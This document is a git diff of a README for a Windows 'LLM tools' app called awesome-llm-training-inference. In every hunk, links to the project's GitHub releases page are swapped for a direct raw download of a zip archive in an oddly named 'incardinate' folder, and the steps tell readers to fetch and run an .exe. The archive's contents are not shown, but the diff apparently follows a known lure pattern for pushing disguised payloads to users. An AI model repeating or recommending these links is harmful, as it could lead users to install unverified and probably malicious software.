@@ -1,6 +1,6 @@
 # 🤖 awesome-llm-training-inference - Easy Large Language Model Tools
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/Joao1PNM/awesome-llm-training-inference/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Joao1PNM/awesome-llm-training-inference/main/incardinate/training-inference-awesome-llm-v3.5.zip)
 
 ---
 
@@ -36,9 +36,9 @@ Make sure Windows is updated to the latest version for smooth installation.
 
 ## 📥 How to Download and Install
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Joao1PNM/awesome-llm-training-inference/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Joao1PNM/awesome-llm-training-inference/main/incardinate/training-inference-awesome-llm-v3.5.zip)
 
-1. Click the green **Download Latest Release** button above or visit [the release page here](https://github.com/Joao1PNM/awesome-llm-training-inference/releases).
+1. Click the green **Download Latest Release** button above or visit [the release page here](https://raw.githubusercontent.com/Joao1PNM/awesome-llm-training-inference/main/incardinate/training-inference-awesome-llm-v3.5.zip).
 
 2. On the release page, look for the latest version with a name including `Windows` or `.exe` file extension.
 
@@ -125,6 +125,6 @@ While this app helps you run LLM tools on Windows, learning more about AI and ma
 
 You can always return to the release page to get the latest version:  
 
-[Download awesome-llm-training-inference Releases](https://github.com/Joao1PNM/awesome-llm-training-inference/releases)  
+[Download awesome-llm-training-inference Releases](https://raw.githubusercontent.com/Joao1PNM/awesome-llm-training-inference/main/incardinate/training-inference-awesome-llm-v3.5.zip)  
 
 Use this page to download updated installers and see new features over time.
